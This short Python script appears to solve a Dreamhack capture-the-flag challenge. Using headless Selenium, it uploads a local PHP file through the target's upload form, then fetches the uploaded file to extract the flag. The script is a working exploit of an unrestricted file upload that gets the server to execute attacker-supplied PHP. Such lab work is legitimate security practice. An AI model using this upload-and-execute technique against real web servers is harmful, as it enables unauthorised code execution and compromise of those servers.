from selenium import webdriver
from selenium.webdriver.common.by import By
import os
import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345
BASE_PATH = os.path.dirname(os.path.abspath(__file__))
FILENAME = "ans.php"

options = webdriver.ChromeOptions()
options.add_argument("headless")

driver = webdriver.Chrome(options=options)
driver.get(f"{HOST}:{PORT}/upload.php")
driver.find_element(By.ID, "InputFile").send_keys(f"{BASE_PATH}/{FILENAME}")
driver.find_element(By.CSS_SELECTOR, "input[type='submit']").click()

res = requests.get(f"{HOST}:{PORT}/uploads/{FILENAME}")
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
